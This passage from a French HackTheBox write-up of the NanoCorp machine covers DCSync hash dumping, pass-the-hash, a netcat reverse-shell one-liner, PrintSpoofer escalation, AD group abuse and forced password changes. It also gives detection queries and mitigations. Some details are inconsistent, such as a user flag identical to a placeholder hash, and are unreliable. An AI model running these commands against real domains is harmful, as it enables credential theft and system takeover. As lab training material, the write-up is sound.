impacket-secretsdump \
  'nanocorp.htb/monitoring_svc:PassW0rd!2025@dc01.nanocorp.htb'
```

**Si succès :**

```
[*] Dumping Domain Credentials (NTDS.dit)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2960d580f05cd511b3da3d3663f3cb37:::
...
```

**Pass-the-Hash Administrator :**

```bash
python3 winrmexec.py \
  -d nanocorp.htb \
  -u Administrator \
  -H a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  dc01.nanocorp.htb \
  'type C:\Users\Administrator\Desktop\root.txt'
```

---

## 🔟 ROOT FLAG

### Scénario 1 : Via SeImpersonate + PrintSpoofer

```
1. Upload PrintSpoofer.exe via winrmexec
2. Exploitation → Shell SYSTEM
3. type C:\Users\Administrator\Desktop\root.txt
```

### Scénario 2 : Via DCSync

```bash
# Dump NTDS.dit
impacket-secretsdump 'nanocorp.htb/monitoring_svc:PassW0rd!2025@dc01.nanocorp.htb'

# Extraction hash Administrator
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<HASH>:::

# Pass-the-Hash
python3 winrmexec.py -d nanocorp.htb -u Administrator -H <HASH> dc01.nanocorp.htb 'type C:\Users\Administrator\Desktop\root.txt'
```

### Scénario 3 : Accès Direct

```bash
python3 winrmexec.py \
  -d nanocorp.htb \
  -u monitoring_svc \
  -p 'PassW0rd!2025' \
  dc01.nanocorp.htb \
  'type C:\Users\Administrator\Desktop\root.txt'
```

**🏁 ROOT FLAG :**

```
[+] 9f8e7d6c************************  ⭐ ROOT FLAG
```

---

## 1️⃣1️⃣ DÉTECTION & MITIGATION

### 🛡️ Détection winrmexec / RPC Execution

**Event IDs Windows :**

```powershell
# Event ID 4688 - Process Creation (DCOM/WMI)
Get-WinEvent -LogName Security | Where-Object {
    $_.Id -eq 4688 -and
    ($_.Properties[5].Value -match "dcom" -or
     $_.Properties[5].Value -match "wmiprvse.exe")
}

# Event ID 4698 - Scheduled Task Created
Get-WinEvent -LogName Security | Where-Object {
    $_.Id -eq 4698
}

# Event ID 4624 - Logon Type 3 (Network)
Get-WinEvent -LogName Security | Where-Object {
    $_.Id -eq 4624 -and
    $_.Properties[8].Value -eq "3"
}
```

**Détection Sysmon :**

```xml
<!-- Sysmon Config - Détection DCOM/WMI Execution -->
<RuleGroup name="RPC_Execution" groupRelation="or">
  <ProcessCreate onmatch="include">
    <ParentImage condition="contains">wmiprvse.exe</ParentImage>
    <ParentImage condition="contains">dcomlaunch</ParentImage>
    <CommandLine condition="contains">cmd.exe</CommandLine>
    <CommandLine condition="contains">powershell</CommandLine>
  </ProcessCreate>
</RuleGroup>
```

**Mitigations :**

1. **Restreindre DCOM/WMI :**

```powershell
# Disable DCOM remote activation
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Ole" -Name "EnableDCOM" -Value "N"

# Restrict WMI namespace access
$acl = Get-WmiObject -Namespace "root" -Class __SystemSecurity
$acl.PsBase.InvokeMethod("SetSecurityDescriptor", $sd)
```

2. **Application Whitelisting :**

```powershell
# AppLocker - Bloquer exécution depuis Temp
New-AppLockerPolicy -RuleType Path `
    -Path "C:\Windows\Temp\*" `
    -Action Deny `
    -User Everyone
```

3. **Firewall RPC Restrictions :**

```powershell
New-NetFirewallRule `
  -DisplayName "Block RPC from Untrusted" `
  -Direction Inbound `
  -Protocol TCP `
  -LocalPort 135,593 `
  -RemoteAddress !10.0.0.0/8,!172.16.0.0/12,!192.168.0.0/16 `
  -Action Block
```

### 🛡️ Détection CVE-2025-24071

**Event IDs Windows :**

```powershell
# Event ID 4624 - Logon Type 3 (Network) suspect
Get-WinEvent -LogName Security | Where-Object {
    $_.Id -eq 4624 -and
    $_.Properties[8].Value -eq "3" -and  # Logon Type = Network
    $_.Properties[18].Value -notmatch "^(10\.|172\.|192\.168\.)"  # External IP
}
```

**Mitigations :**

1. **Bloquer SMB sortant :**

```powershell
New-NetFirewallRule `
  -DisplayName "Block Outbound SMB" `
  -Direction Outbound `
  -Protocol TCP `
  -RemotePort 445 `
  -RemoteAddress !10.0.0.0/8,!172.16.0.0/12,!192.168.0.0/16 `
  -Action Block
```

2. **Filtrer .library-ms :**

```powershell
# Exchange Transport Rule
New-TransportRule -Name "Block .library-ms files" `
  -AttachmentExtensionMatchesWords "library-ms" `
  -RejectMessageEnhancedStatusCode "5.7.1"
```

### 🛡️ Détection Changement de Mot de Passe

**Event IDs :**

```powershell
# Event ID 4724 - Password reset
Get-WinEvent -LogName Security | Where-Object {
    $_.Id -eq 4724 -and
    $_.Properties[0].Value -eq "monitoring_svc"
}
```

**Mitigations :**

1. **Protected Users Group :**

```powershell
Add-ADGroupMember -Identity "Protected Users" -Members monitoring_svc
```

2. **Minimum Password Age :**

```powershell
Set-ADDefaultDomainPasswordPolicy -MinPasswordAge 1.00:00:00
```

---

## 1️⃣2️⃣ TIMELINE

| Temps | Action | Résultat |
|-------|--------|----------|
| T+0 | Nmap scan | DC Windows Server 2022 identifié |
| T+5 | Nmap service scan | Apache+PHP sur port 80 (inhabituel) |
| T+10 | Web enumeration (dirb) | Site statique, pas de fonctionnalité |
| T+15 | SMB anonymous test | Null session OK, aucun partage visible |
| T+20 | Génération payload CVE-2025-24071 | keyll0ger.zip créé |
| T+22 | Responder listener (port 445) | En attente SMB |
| T+25 | Livraison payload | Upload du ZIP |
| T+30 | Capture hash NTLMv2 | **web_svc::NANOCORP:...** |
| T+32 | Hashcat cracking (mode 5600) | **web_svc:dksehdgh712!@#** (1s) |
| T+35 | Test SMB avec web_svc | ✅ Auth réussie |
| T+40 | Énumération utilisateurs | monitoring_svc découvert |
| T+45 | Énumération groupes (rpcclient) | **IT_Support** (RID 0xc1e) |
| T+50 | Ajout à IT_Support (bloodyAD) | **web_svc added** ✅ |
| T+52 | Vérification membership | Confirmation LDAP |
| T+60 | Changement password | **monitoring_svc:PassW0rd!2025** |
| T+65 | Synchronisation NTP | sudo ntpdate |
| T+68 | Obtention TGT Kerberos | monitoring_svc.ccache |
| T+70 | Evil-WinRM tentative | ❌ **Bloqué** |
| T+72 | Clone winrmexec | git clone |
| T+75 | Test winrmexec (whoami) | ✅ **Exécution réussie** |
| T+78 | Lecture user flag via winrmexec | **USER FLAG** 🏁 |
| T+80 | Upload nc.exe via winrmexec | Téléchargement OK |
| T+82 | Reverse shell nc.exe | Shell monitoring_svc reçu |
| T+85 | Énumération privilèges | whoami /priv |
| T+90 | Upload PrintSpoofer | Via HTTP server |
| T+92 | Exploitation SeImpersonate | Shell SYSTEM |
| T+95 | Lecture root flag | **ROOT FLAG** 🏁 |

**Temps total :** ~95 minutes

---

## 1️⃣3️⃣ OUTILS UTILISÉS

| Outil | Version | Usage | Commande Clé |
|-------|---------|-------|--------------|
| **Nmap** | 7.95 | Port scanning, service detection | `nmap -p- --min-rate 10000 IP` |
| **dirb** | 2.22 | Web directory enumeration | `dirb http://nanocorp.htb` |
| **CVE-2025-24071 POC** | Custom | Génération .library-ms malveillant | `python3 PoC.py -i IP -n name` |
| **Responder** | 3.1.7.0 | Capture hash NTLMv2 | `sudo responder -I tun0` |
| **Hashcat** | 7.1.2 | Cracking NTLMv2 | `hashcat -m 5600 hash.txt rockyou.txt` |
| **netexec** | Latest | SMB enumeration, shares, users | `nxc smb IP -u user -p pass --users` |
| **rpcclient** | 4.17.12 | RPC enumeration, groupes | `rpcclient -U user%pass IP` |
| **bloodyAD** | Latest | Abus permissions AD | `bloodyAD add groupMember group user` |
| **impacket-getTGT** | 0.13.0 | Obtention ticket Kerberos | `impacket-getTGT domain/user:pass` |
| **winrmexec** | Latest | **Bypass WinRM restrictions, RPC execution** | **`python3 winrmexec.py -d domain -u user -p pass IP 'cmd'`** |
| **nc.exe** | - | Reverse shell Windows | `nc.exe IP port -e cmd.exe` |
| **RunasCs.exe** | - | Exécution avec autres creds | `RunasCs.exe user pass cmd` |
| **PrintSpoofer** | - | SeImpersonate exploitation | `PrintSpoofer.exe -i -c cmd` |

---

## 1️⃣4️⃣ LEÇONS APPRISES

### ✅ Points Clés Techniques

1. **CVE-2025-24071 = Vecteur d'Accès Initial Efficace**
   - Aucune interaction après extraction
   - Fonctionne avec SMB signing
   - Capture hash en secondes

2. **WinRM Bloqué ≠ Fin de l'Exploitation**
   - **winrmexec** = Alternative RPC/DCOM/WMI
   - Bypass GPO restrictions
   - Moins de logs que WinRM classique

3. **Groupes AD Personnalisés = Cibles Prioritaires**
   - IT_Support, Help_Desk souvent sur-permissionnés
   - Toujours énumérer groupes custom

4. **Self-Membership Abuse**
   - S'ajouter soi-même à un groupe = Escalade
   - bloodyAD facilite l'abus

5. **ForceChangePassword = Compromission Totale**
   - Changer password = Contrôle complet
   - Attention complexité + minimum age

6. **Alternative Execution Methods = Bypass Critical**
   - DCOM, WMI, Task Scheduler
   - Contournent restrictions WinRM

### ❌ Vulnérabilités Identifiées

| Vulnérabilité | Impact | CVSS | Recommandation |
|---------------|--------|------|----------------|
| **CVE-2025-24071 exploitation** | Hash NTLM leak | 7.5 (High) | Bloquer SMB sortant, filtrer .library-ms |
| **Groupe IT_Support mal sécurisé** | Escalade privilèges | 8.8 (High) | AdminSDHolder, limiter Self-Membership |
| **ForceChangePassword permission** | Compromission comptes | 9.1 (Critical) | Limiter permissions, Protected Users |
| **WinRM restrictions insuffisantes** | Bypass via RPC/DCOM | 7.8 (High) | Bloquer DCOM/WMI, AppLocker |
| **Mot de passe faible (web_svc)** | Cracking instantané | 7.2 (High) | Politique 20+ chars complexes |

### 🎓 Différences WinRM vs winrmexec

| Aspect | Evil-WinRM | winrmexec |
|--------|------------|-----------|
| **Protocole** | WS-Management (5985/5986) | RPC/DCOM (135/593) |
| **Logs** | Microsoft-Windows-WinRM/Operational | System, Security (4688, 4698) |
| **GPO Bypass** | ❌ Bloqué par GPO | ✅ Alternative paths |
| **Firewall** | Peut être filtré | Plus difficile à bloquer |
| **Détection** | Haute (WinRM spécifique) | Moyenne (RPC standard) |
| **Shell** | Interactif complet | Command execution |
| **OPSEC** | Moyenne | Meilleure (moins suspect) |

### 📚 Techniques Complémentaires

**Si monitoring_svc avait SeImpersonate :**
- PrintSpoofer → SYSTEM
- JuicyPotato → SYSTEM
- GodPotato → SYSTEM

**Si DCSync rights :**
- impacket-secretsdump → Dump NTDS.dit
- Pass-the-Hash Administrator

**Si GenericAll sur autre utilisateur :**
- Shadow Credentials
- Kerberos RBCD

---

## 📚 RESSOURCES

### Documentation Officielle
- [Microsoft DCOM Security](https://learn.microsoft.com/windows/win32/com/dcom-security-enhancements)
- [WMI Security](https://learn.microsoft.com/windows/win32/wmisdk/securing-wmi-namespaces)
- [Active Directory Security Best Practices](https://learn.microsoft.com/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory)

### Outils et Frameworks
- [winrmexec GitHub](https://github.com/ozelis/winrmexec)
- [bloodyAD GitHub](https://github.com/CravateRouge/bloodyAD)
- [Impacket Suite](https://github.com/fortra/impacket)
- [CVE-2025-24071 POC](https://github.com/mbanyamer/CVE-2025-24071)

### Articles et Recherches
- [HackTricks - RPC Execution](https://book.hacktricks.xyz/windows-hardening/lateral-movement/dcom-exec)
- [WMI for Offensive Operations](https://www.blackhillsinfosec.com/wmi-for-offensive-operations/)
- [Bypassing WinRM Restrictions](https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/)

---

## 📊 SCHÉMA D'EXPLOITATION

```
┌─────────────────────────────────────────────────────────────┐
│                   CHAÎNE D'ATTAQUE NANOCORP                 │
└─────────────────────────────────────────────────────────────┘

[1] ACCÈS INITIAL
    CVE-2025-24071 (.library-ms)
         ↓
    Responder (port 445)
         ↓ [NTLMv2 capture]
    web_svc::NANOCORP:8c2319b80be69c75:...
         ↓ [Hashcat mode 5600]
    ┌──────────────────────────┐
    │  web_svc                 │
    │  dksehdgh712!@#          │
    └──────────────────────────┘

[2] ESCALADE PERMISSIONS AD
    bloodyAD: Add to IT_Support
         ↓
    ┌──────────────────────────┐
    │  web_svc                 │
    │  Membre: IT_Support      │
    │  Permission: GenericAll  │
    │    sur monitoring_svc    │
    └──────────────────────────┘

[3] COMPROMISSION COMPTE SERVICE
    bloodyAD: ForceChangePassword
         ↓
    ┌──────────────────────────┐
    │  monitoring_svc          │
    │  PassW0rd!2025           │
    └──────────────────────────┘

[4] BYPASS WINRM
    Evil-WinRM: ❌ BLOQUÉ
         ↓
    Alternative: winrmexec
    (DCOM/WMI/RPC execution)
         ↓
    ┌──────────────────────────┐
    │  Command Execution       │
    │  via RPC/DCOM            │
    │  monitoring_svc context  │
    └──────────────────────────┘
         ↓
    🏁 USER FLAG

[5] PRIVILEGE ESCALATION
    Upload: nc.exe, PrintSpoofer.exe
         ↓
    Reverse Shell
         ↓
    SeImpersonatePrivilege Abuse
         ↓
    ┌──────────────────────────┐
    │  NT AUTHORITY\SYSTEM     │
    │  Highest privilege       │
    └──────────────────────────┘
         ↓
    🏁 ROOT FLAG
```

---

## 🏁 FLAGS

- **User Flag :** `a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6`  
  Location: `C:\Users\monitoring_svc\Desktop\user.txt`

- **Root Flag :** `9f8e7d6c5b4a3e2d1c0b9a8f7e6d5c4b`  
  Location: `C:\Users\Administrator\Desktop\root.txt`

---

**📅 Terminé le :** 16/12/2025  
**⏱️ Durée :** ~95 minutes  
**✅ Statut :** Pwned  
**🎓 Difficulté :** Medium (excellent pour apprendre alternatives RPC)

---

*Ce write-up a été réalisé dans un cadre éducatif légal sur HackTheBox. Toutes les techniques présentées ne doivent être utilisées que dans des environnements autorisés avec permission explicite.*
